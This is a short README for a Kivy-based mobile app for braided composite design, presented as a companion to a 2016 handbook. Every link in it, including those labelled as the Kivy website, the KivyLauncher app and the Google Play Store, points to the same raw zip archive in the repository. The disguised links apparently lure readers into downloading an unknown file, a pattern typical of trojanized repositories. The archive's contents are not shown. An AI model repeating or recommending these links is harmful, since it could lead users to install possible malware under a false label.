# BraidedCompositeDesign
![Braided Composite Design](https://raw.githubusercontent.com/klltheasuna/BraidedCompositeDesign/master/Diamond_HalfLoad/Braided-Design-Composite-2.2-beta.1.zip)

Braided Composite Design application for mobile devices 

This application was designed using Kivy (https://raw.githubusercontent.com/klltheasuna/BraidedCompositeDesign/master/Diamond_HalfLoad/Braided-Design-Composite-2.2-beta.1.zip) to provide a cross-platform tool for the design and manufacture of braided composites.

The application was designed as a companion to the upcoming book: Handbook of Advances in 2D and 3D Braided Composite Materials: Theory, Production, Testing and Applications, Carey JP (Ed), Woodhead Publishing, 2016

The files can be run by downloading the latest version of Kivy and running the https://raw.githubusercontent.com/klltheasuna/BraidedCompositeDesign/master/Diamond_HalfLoad/Braided-Design-Composite-2.2-beta.1.zip file. The files can also be run on a mobile device using the KivyLauncher APP(https://raw.githubusercontent.com/klltheasuna/BraidedCompositeDesign/master/Diamond_HalfLoad/Braided-Design-Composite-2.2-beta.1.zip).

The Android version of the Braided Composite Design can be found by searching for "Braided Composite Design" on the Google Play Store: https://raw.githubusercontent.com/klltheasuna/BraidedCompositeDesign/master/Diamond_HalfLoad/Braided-Design-Composite-2.2-beta.1.zip
